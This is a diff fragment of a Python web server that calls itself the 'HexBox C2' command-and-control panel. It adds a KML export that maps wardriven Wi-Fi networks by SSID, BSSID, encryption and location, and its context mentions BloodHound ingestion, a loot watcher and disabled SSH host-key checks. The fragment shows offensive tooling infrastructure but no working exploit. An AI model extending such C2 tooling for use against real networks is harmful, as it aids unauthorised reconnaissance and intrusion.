+            color = "ff00ff00" if enc == "Open" else "ff0000ff"
+            lines += [
+                "<Placemark>",
+                f"<name>{n.get('ssid','(hidden)')}</name>",
+                f"<description>BSSID: {n.get('bssid','?')} | {enc} | {n.get('signal','?')} dBm | Ch {n.get('channel','?')}</description>",
+                f"<Style><IconStyle><color>{color}</color></IconStyle></Style>",
+                f"<Point><coordinates>{n.get('lon')},{n.get('lat')},0</coordinates></Point>",
+                "</Placemark>",
+            ]
+        lines += ["</Document></kml>"]
+        from io import BytesIO
+        return send_file(BytesIO("\n".join(lines).encode()),
+                         as_attachment=True,
+                         download_name=f"wardrive_{ts}.kml",
+                         mimetype="application/vnd.google-earth.kml+xml")
+
+    return jsonify(error="unsupported format"), 400
+
+# ---------------------------------------------------------------------------
 # Routes — BloodHound auto-ingestion
 # ---------------------------------------------------------------------------
 
@@ -2399,7 +3092,7 @@ if __name__ == "__main__":
         t = threading.Thread(target=_loot_watcher, daemon=True)
         t.start()
 
-    print(f"[+] HexBox C2 (Phase 4) online → http://0.0.0.0:{PORT}")
+    print(f"[+] HexBox C2 (Phase 5) online → http://0.0.0.0:{PORT}")
     if not os.environ.get("HEXBOX_TOKEN") and not _HB.get("api_token"):
         print(f"[!] Access token (set HEXBOX_TOKEN env var to pin): {_TOKEN}")
     print(f"[!] SSH host-key verification is DISABLED (AutoAddPolicy) — see README for hardening")
